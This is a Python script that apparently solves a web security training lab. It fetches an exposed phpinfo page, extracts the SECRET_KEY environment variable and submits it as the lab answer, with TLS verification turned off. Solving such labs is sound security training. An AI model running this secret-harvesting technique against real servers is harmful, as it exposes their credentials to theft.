import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_key(s, url):
    print("[*] Fetching SECRET_KEY environment variable...")
    phpinfo_url = url + "/cgi-bin/phpinfo.php"
    r = requests.get(phpinfo_url, verify=False, timeout=10)
    res = r.text
    if "SECRET_KEY" in res:
        print("[+] SECRET_KEY discovered")
        soup = BeautifulSoup(r.text,'html.parser')
        secret_key = soup.body.find(string="SECRET_KEY ").parent.find_next("td").contents[0]
        secret_key = secret_key.strip()
        print(f"[+] SECRET_KEY: {secret_key}")
        return secret_key
    return None

def submit_answer(s, url):
    key = get_key(s, url)
    print("[*] Submitting answer...")
    submit_url = url + "/submitSolution"
    data = {"answer": key}
    r = s.post(submit_url, data=data, verify=False, allow_redirects=True)
    if "true" in r.text:
        return True
    return False 

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if  not submit_answer(s, url):
        print("[+] Error submitting answer")
        return
    print("[+] Lab solved") 

if __name__=="__main__":
    main()